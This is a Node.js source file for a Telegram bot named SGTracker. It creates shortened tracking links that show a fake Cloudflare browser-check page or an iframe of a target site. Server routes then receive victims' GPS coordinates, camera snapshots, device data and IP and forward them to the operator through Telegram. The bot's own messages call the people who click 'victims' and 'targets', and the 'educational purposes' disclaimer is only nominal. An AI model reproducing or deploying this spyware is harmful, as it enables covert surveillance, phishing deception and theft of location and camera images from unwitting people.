require('dotenv').config();
const fs = require('fs');
const path = require('path');
const express = require('express');
const serverless = require('serverless-http');
const cors = require('cors');
const bodyParser = require('body-parser');
const fetch = require('node-fetch');
const TelegramBot = require('node-telegram-bot-api');
const ejs = require('ejs');

// Initialize Express app
const app = express();

// Middleware
app.use(bodyParser.json({limit:1024*1024*20, type:'application/json'}));
app.use(bodyParser.urlencoded({ extended:true, limit:1024*1024*20, type:'application/x-www-form-urlencoded' }));
app.use(cors());

// Global variables
const bot = new TelegramBot(process.env.bot);
const hostURL = "https://YOUR-VERCEL-URL-HERE.vercel.app"; // अपना Vercel URL यहां पेस्ट करें
const use1pt = false;

// Get the template paths
const viewsPath = path.join(process.cwd(), 'views');
const webviewTemplate = fs.readFileSync(path.join(viewsPath, 'webview.ejs'), 'utf8');
const cloudflareTemplate = fs.readFileSync(path.join(viewsPath, 'cloudflare.ejs'), 'utf8');

// Helper functions
function getClientIp(req) {
  let ip;
  if (req.headers['x-forwarded-for']) {
    ip = req.headers['x-forwarded-for'].split(",")[0];
  } else if (req.connection && req.connection.remoteAddress) {
    ip = req.connection.remoteAddress;
  } else {
    ip = req.ip;
  }
  return ip;
}

function getFormattedDate() {
  var d = new Date();
  return d.toJSON().slice(0, 19).replace('T', ':');
}

function atob(str) {
  return Buffer.from(str, 'base64').toString();
}

// URL Shortening Services
// 1. XCut URL Shortener (your provided shortener)
async function shortenUrlWithXcut(url) {
  try {
    const response = await fetch('https://xcut.vercel.app/api/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ url }),
    });
    
    const data = await response.json();
    
    if (!response.ok) {
      throw new Error(data.error || 'Failed to shorten URL with XCut');
    }
    
    return data.shortUrl;
  } catch (error) {
    console.error('Error shortening URL with XCut:', error);
    throw error;
  }
}

// 2. TinyURL Shortener
async function shortenUrlWithTinyurl(url) {
  try {
    const response = await fetch(`https://tinyurl.com/api-create.php?url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with TinyURL');
    }
    return await response.text();
  } catch (error) {
    console.error('Error shortening URL with TinyURL:', error);
    throw error;
  }
}

// 3. Is.gd URL Shortener (Open Source)
async function shortenUrlWithIsgd(url) {
  try {
    const response = await fetch(`https://is.gd/create.php?format=simple&url=${encodeURIComponent(url)}`);
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Is.gd');
    }
    const shortUrl = await response.text();
    return shortUrl;
  } catch (error) {
    console.error('Error shortening URL with Is.gd:', error);
    throw error;
  }
}

// 4. Cleanuri URL Shortener (Open Source)
async function shortenUrlWithCleanuri(url) {
  try {
    const response = await fetch('https://cleanuri.com/api/v1/shorten', {
      method: 'POST',
      headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
      },
      body: `url=${encodeURIComponent(url)}`,
    });
    
    if (!response.ok) {
      throw new Error('Failed to shorten URL with Cleanuri');
    }
    
    const data = await response.json();
    return data.result_url;
  } catch (error) {
    console.error('Error shortening URL with Cleanuri:', error);
    throw error;
  }
}

// Attempt to shorten a URL with multiple services
async function shortenUrl(url) {
  const results = [];
  const shorteners = [
    { name: "XCut", fn: shortenUrlWithXcut },
    { name: "TinyURL", fn: shortenUrlWithTinyurl },
    { name: "Is.gd", fn: shortenUrlWithIsgd },
    { name: "Cleanuri", fn: shortenUrlWithCleanuri }
  ];
  
  for (const shortener of shorteners) {
    try {
      const shortUrl = await shortener.fn(url);
      if (shortUrl) {
        results.push({ name: shortener.name, url: shortUrl });
      }
    } catch (error) {
      // Silently fail - we'll only show successful shorteners
      console.log(`${shortener.name} shortener failed for ${url}: ${error.message}`);
    }
  }
  
  return results;
}

// Create a link function (webhook version)
async function createLink(cid, msg) {
  var encoded = [...msg].some(char => char.charCodeAt(0) > 127);

  if ((msg.toLowerCase().indexOf('http') > -1 || msg.toLowerCase().indexOf('https') > -1) && !encoded) {
    var url = cid.toString(36) + '/' + Buffer.from(msg).toString('base64');
    var m = {
      reply_markup: JSON.stringify({
        "inline_keyboard": [
          [{ text: "🔄 Create New Link", callback_data: "crenew" }]
        ]
      })
    };

    var cUrl = `${hostURL}/c/${url}`;
    var wUrl = `${hostURL}/w/${url}`;

    // Create loading animation frames
    const loadingFrames = [
      "⬜⬜⬜⬜⬜",
      "⬛⬜⬜⬜⬜",
      "⬛⬛⬜⬜⬜",
      "⬛⬛⬛⬜⬜",
      "⬛⬛⬛⬛⬜",
      "⬛⬛⬛⬛⬛"
    ];
    
    // Send a processing message with initial animation frame
    const processingMsgId = await bot.sendMessage(
      cid, 
      `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[0]}\n<i>Please wait while we prepare everything for you...</i>`, 
      { parse_mode: "HTML" }
    ).then(msg => msg.message_id);
    
    // Start the loading animation
    let currentFrame = 0;
    const animationInterval = setInterval(async () => {
      currentFrame = (currentFrame + 1) % loadingFrames.length;
      try {
        await bot.editMessageText(
          `<b>🔮 Generating your tracking links...</b>\n${loadingFrames[currentFrame]}\n<i>Please wait while we prepare everything for you...</i>`,
          {
            chat_id: cid,
            message_id: processingMsgId,
            parse_mode: "HTML"
          }
        );
      } catch (error) {
        console.log("Animation update error:", error);
      }
    }, 500);
    
    // Show typing indicator for better UX
    await bot.sendChatAction(cid, "typing");
    
    try {
      // First shorten the CloudFlare link with multiple services
      const shortenedCUrls = await shortenUrl(cUrl);
      
      // Then shorten the WebView link with multiple services
      const shortenedWUrls = await shortenUrl(wUrl);
      
      // Stop the animation
      clearInterval(animationInterval);
      
      // Show typing indicator again
      await bot.sendChatAction(cid, "typing");
      
      if (shortenedCUrls.length > 0 || shortenedWUrls.length > 0) {
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        // Add CloudFlare links with better formatting and visuals
        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
        message += `<i>Shows a Cloudflare security check page before redirecting</i>\n\n`;
        message += `🔗 <a href="${cUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - using only symbols, no service names
        if (shortenedCUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedCUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>🌐 WEBVIEW PAGE LINK</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n\n`;
        message += `🔗 <a href="${wUrl}">Click to open</a>\n\n`;
        
        // Only add shorteners that worked - using only symbols, no service names
        if (shortenedWUrls.length > 0) {
          message += `<b>📎 Shortened URLs:</b>\n`;
          shortenedWUrls.forEach((shortened, index) => {
            let symbol = '';
            if (shortened.name === 'XCut') symbol = '⚡';
            else if (shortened.name === 'TinyURL') symbol = '🔗';
            else if (shortened.name === 'Is.gd') symbol = '🌟';
            else if (shortened.name === 'Cleanuri') symbol = '💫';
            else symbol = '🔗';
            
            message += `${symbol} <a href="${shortened.url}">${shortened.url}</a>\n`;
          });
        }
        
        message += `\n<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
        
        // Edit the loading message instead of sending a new one
        await bot.editMessageText(message, {
          chat_id: cid,
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      } else {
        // If all URL shorteners fail, edit the loading message with direct links
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
        
        // Edit the loading message instead of sending a new one
        await bot.editMessageText(message, {
          chat_id: cid,
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      }
    } catch (error) {
      console.error("Error shortening URLs:", error);
      
      // Stop the animation if it's still running
      try {
        clearInterval(animationInterval);
      } catch (e) {
        console.log("Error clearing animation interval:", e);
      }
      
      // If error occurs, edit the loading message with direct links
      try {
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
        
        // Edit the loading message instead of sending a new one
        await bot.editMessageText(message, {
          chat_id: cid,
          message_id: processingMsgId,
          parse_mode: "HTML",
          reply_markup: m.reply_markup
        });
      } catch (e) {
        console.log("Error editing message, sending a new one:", e);
        
        // Fallback to sending a new message if editing fails
        let message = `<b>🎯 TRACKING LINKS GENERATED!</b>\n\n`;
        message += `<b>🔗 Original URL:</b> <code>${msg}</code>\n`;
        message += `<b>⏰ Generated at:</b> <code>${getFormattedDate()}</code>\n\n`;
        message += `<b>✨ YOUR TRACKING LINKS ✨</b>\n\n`;
        
        message += `<b>🛡️ CLOUDFLARE PAGE LINK</b>\n`;
        message += `<i>Shows a Cloudflare security check page</i>\n`;
        message += `<a href="${cUrl}">${cUrl}</a>\n\n`;
        
        message += `<b>🌐 WEBVIEW PAGE LINK</b>\n`;
        message += `<i>Shows the target website in an iframe</i>\n`;
        message += `<a href="${wUrl}">${wUrl}</a>\n\n`;
        
        message += `<b>⚠️ Remember:</b> <i>These links will collect victim's data when opened.</i>`;
        
        await bot.sendMessage(cid, message, { 
          reply_markup: m.reply_markup,
          parse_mode: "HTML"
        });
      }
    }
    
    return true;
  } else {
    await bot.sendMessage(cid, `<b>⚠️ ERROR!</b>\n\nPlease enter a valid URL including http or https.`, { parse_mode: "HTML" });
    await createNew(cid);
    return false;
  }
}

// Create new request function (webhook version)
async function createNew(cid) {
  var mk = {
    reply_markup: JSON.stringify({ "force_reply": true })
  };
  await bot.sendMessage(cid, `🌐 Enter Your URL`, mk);
}

// ROUTES

// Root route - returns the client IP
app.get("/", (req, res) => {
  const ip = getClientIp(req);
  res.json({"ip": ip});
});

// POST route for device information
app.post("/", (req, res) => {
  var uid = decodeURIComponent(req.body.uid) || null;
  var data = decodeURIComponent(req.body.data) || null;
  
  var ip = getClientIp(req);
    
  if (uid != null && data != null) {
    if (data.indexOf(ip) < 0) {
      return res.send("ok");
    }
    
    data = data.replaceAll("<br>", "\n");
    
    bot.sendMessage(parseInt(uid, 36), data, {parse_mode: "HTML"});
    
    res.send("Done");
  } else {
    res.status(400).send("Bad Request");
  }
});

// Location route
app.post("/location", async (req, res) => {
  try {
    var lat = parseFloat(decodeURIComponent(req.body.lat)) || null;
    var lon = parseFloat(decodeURIComponent(req.body.lon)) || null;
    var uid = decodeURIComponent(req.body.uid) || null;
    var acc = decodeURIComponent(req.body.acc) || null;
    
    if (lon != null && lat != null && uid != null && acc != null) {
      await bot.sendLocation(parseInt(uid, 36), lat, lon);
      await bot.sendMessage(parseInt(uid, 36), `Latitude: ${lat}\nLongitude: ${lon}\nAccuracy: ${acc} meters`);
      
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in location handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Camera snapshot route
app.post("/camsnap", async (req, res) => {
  try {
    var uid = decodeURIComponent(req.body.uid) || null;
    var img = decodeURIComponent(req.body.img) || null;
      
    if (uid != null && img != null) {
      var buffer = Buffer.from(img, 'base64');
        
      var info = {
        filename: "camsnap.png",
        contentType: 'image/png'
      };
        
      try {
        await bot.sendPhoto(parseInt(uid, 36), buffer, {}, info);
      } catch (error) {
        console.log("Error sending photo:", error);
      }
        
      res.send("Done");
    } else {
      res.status(400).send("Bad Request");
    }
  } catch (error) {
    console.error("Error in camsnap handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Webview route
app.get("/w/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(webviewTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in webview handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Cloudflare route
app.get("/c/:uid/:uri", async (req, res) => {
  try {
    const uid = req.params.uid;
    const uri = req.params.uri;
    
    if (!uid || !uri) {
      return res.redirect("https://t.me/th30neand0nly0ne");
    }
    
    const ip = getClientIp(req);
    const time = getFormattedDate();
    
    // Render the template
    const html = ejs.render(cloudflareTemplate, {
      ip: ip,
      time: time,
      url: atob(uri),
      uid: uid,
      a: hostURL,
      t: use1pt
    });
    
    res.setHeader('Content-Type', 'text/html');
    res.send(html);
  } catch (error) {
    console.error("Error in cloudflare handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Telegram Bot Webhook Handler for production
app.post("/webhook", async (req, res) => {
  try {
    const update = req.body;
    
    // Handle callback queries (button clicks)
    if (update.callback_query) {
      const callbackQuery = update.callback_query;
      await bot.answerCallbackQuery(callbackQuery.id);
      
      if (callbackQuery.data === "crenew") {
        await createNew(callbackQuery.message.chat.id);
      } else if (callbackQuery.data === "help") {
        // Show help message when the help button is clicked - edit the current message
        await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
      } else if (callbackQuery.data === "back_to_main") {
        // Go back to main menu
        await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
      }
      
      return res.status(200).send("OK");
    }
    
    // Handle messages
    if (update.message) {
      const msg = update.message;
      const chatId = msg.chat.id;
      
      // Handle reply to "Enter Your URL" message
      if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
        await createLink(chatId, msg.text);
        return res.status(200).send("OK");
      }
      
      // Handle /start command
      if (msg.text === "/start") {
        await sendWelcomeMessage(chatId, msg.chat.first_name);
      }
      // Handle /create command
      else if (msg.text === "/create") {
        await createNew(chatId);
      }
      // Handle /help command
      else if (msg.text === "/help") {
        await sendHelpMessage(chatId);
      }
    }
    
    res.status(200).send("OK");
  } catch (error) {
    console.error("Error in webhook handler:", error);
    res.status(500).send("Internal Server Error");
  }
});

// Helper function to send welcome message
async function sendWelcomeMessage(chatId, firstName, messageId = null) {
  // Create welcome message keyboard with emojis
  const welcomeKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "ℹ️ Help", callback_data: "help" }
        ]
      ]
    })
  };
  
  // Welcome message text
  const welcomeText = 
    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
    `<b>📱 What You Can Track:</b>\n` +
    `• 📍 Precise Location\n` +
    `• 📷 Camera Snapshots\n` +
    `• 💻 Device Information\n` +
    `• 🔋 Battery Status\n` +
    `• 🌐 Network Details\n\n` +
    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`;
  
  // If editing an existing message
  if (messageId) {
    try {
      await bot.editMessageText(welcomeText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: welcomeKeyboard.reply_markup
      });
    } catch (error) {
      console.log("Error editing welcome message:", error);
      // Fallback to sending a new message
      await sendFullWelcomeMessage(chatId, firstName);
    }
  } else {
    // If sending a new message with sticker
    await sendFullWelcomeMessage(chatId, firstName);
  }
}

// Helper function to send full welcome message with properly formatted content
async function sendFullWelcomeMessage(chatId, firstName) {
  // Show typing indicator for a more interactive feel
  await bot.sendChatAction(chatId, "typing");
  
  // Create an enhanced keyboard with emojis
  const welcomeKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "ℹ️ Help", callback_data: "help" }
        ]
      ]
    })
  };
  
  // Send a visually enhanced welcome message (only one message)
  await bot.sendMessage(
    chatId, 
    `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
    `<i>SGTracker</i> is your powerful tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
    `<b>📱 What You Can Track:</b>\n` +
    `• 📍 Precise Location\n` +
    `• 📷 Camera Snapshots\n` +
    `• 💻 Device Information\n` +
    `• 🔋 Battery Status\n` +
    `• 🌐 Network Details\n\n` +
    `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!\n\n` +
    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1`, 
    { 
      parse_mode: "HTML",
      reply_markup: welcomeKeyboard.reply_markup
    }
  );
}

// Helper function to send help message
async function sendHelpMessage(chatId, messageId = null) {
  // Show typing indicator
  await bot.sendChatAction(chatId, "typing");
  
  // Create keyboard with useful links/actions and back button
  const helpKeyboard = {
    reply_markup: JSON.stringify({
      "inline_keyboard": [
        [
          { text: "🔗 Create Tracking Link", callback_data: "crenew" }
        ],
        [
          { text: "🔙 Back to Main Menu", callback_data: "back_to_main" }
        ]
      ]
    })
  };
  
  const helpText = 
    `<b>📚 SGTRACKER HELP GUIDE 📚</b>\n\n` +
    `<i>This bot creates tracking links that collect information about anyone who clicks them.</i>\n\n` +
    
    `<b>🚀 Getting Started:</b>\n` +
    `1️⃣ Type /create or click the button below\n` +
    `2️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
    `3️⃣ The bot will generate your tracking links\n` +
    `4️⃣ Share these links with your target\n` +
    `5️⃣ When they open the link, you'll receive their information\n\n` +
    
    `<b>🔮 Available Link Types:</b>\n\n` +
    `<b>1. 🛡️ Cloudflare Page:</b>\n` +
    `• Shows a fake "Checking your browser" security page\n` +
    `• Collects data while displaying the security check\n` +
    `• Redirects to your target URL afterward\n` +
    `• More convincing for security-conscious users\n\n` +
    
    `<b>2. 🌐 Webview Page:</b>\n` +
    `• Shows your target URL in an iframe immediately\n` +
    `• Collects data in the background\n` +
    `• Note: Some sites block iframe embedding (e.g., Google)\n\n` +
    
    `<b>📱 Information Collected:</b>\n` +
    `• 📍 Location (requires permission)\n` +
    `• 📷 Camera snapshots (requires permission)\n` +
    `• 🖥️ Device & browser details\n` +
    `• 🔋 Battery information\n` +
    `• 🌐 IP address & network data\n\n` +
    
    `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>\n\n` +
    
    `<b>👨‍💻 Created by:</b> @SG_Modder\n` +
    `<b>📢 Channels:</b> @sgmoddernew | @SG_Modder0 | @SG_Modder1\n` +
    `<b>🌐 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>`;
  
  // If messageId is provided, edit the message instead of sending a new one
  if (messageId) {
    try {
      await bot.editMessageText(helpText, {
        chat_id: chatId,
        message_id: messageId,
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup
      });
    } catch (error) {
      console.log("Error editing message:", error);
      // Fallback to sending a new message if editing fails
      await bot.sendMessage(chatId, helpText, { 
        parse_mode: "HTML",
        reply_markup: helpKeyboard.reply_markup 
      });
    }
  } else {
    // Send a new message
    await bot.sendMessage(chatId, helpText, { 
      parse_mode: "HTML",
      reply_markup: helpKeyboard.reply_markup 
    });
  }
}

// For local development
if (process.env.NODE_ENV !== "production") {
  // Start polling for local testing
  console.log("Starting polling for local development...");
  
  bot.on('callback_query', async (callbackQuery) => {
    await bot.answerCallbackQuery(callbackQuery.id);
    
    if (callbackQuery.data === "crenew") {
      await createNew(callbackQuery.message.chat.id);
    } else if (callbackQuery.data === "help") {
      // Show help message when the help button is clicked - edit the current message
      await sendHelpMessage(callbackQuery.message.chat.id, callbackQuery.message.message_id);
    } else if (callbackQuery.data === "back_to_main") {
      // Go back to main menu
      await sendWelcomeMessage(callbackQuery.message.chat.id, callbackQuery.message.chat.first_name, callbackQuery.message.message_id);
    }
  });
  
  bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    
    // Handle reply to "Enter Your URL" message
    if (msg.reply_to_message && msg.reply_to_message.text === "🌐 Enter Your URL") {
      await createLink(chatId, msg.text);
      return;
    }
    
    // Handle /start command
    if (msg.text === "/start") {
      await sendWelcomeMessage(chatId, msg.chat.first_name);
    }
    // Handle /create command
    else if (msg.text === "/create") {
      await createNew(chatId);
    }
    // Handle /help command
    else if (msg.text === "/help") {
      await sendHelpMessage(chatId);
    }
  });
  
  // Start polling
  bot.startPolling();
  
  // Start the server for the web routes
  app.listen(5000, '0.0.0.0', () => {
    console.log("Server running on port 5000");
  });
}

// Export the handler for serverless deployment
module.exports = app;
module.exports.handler = serverless(app);
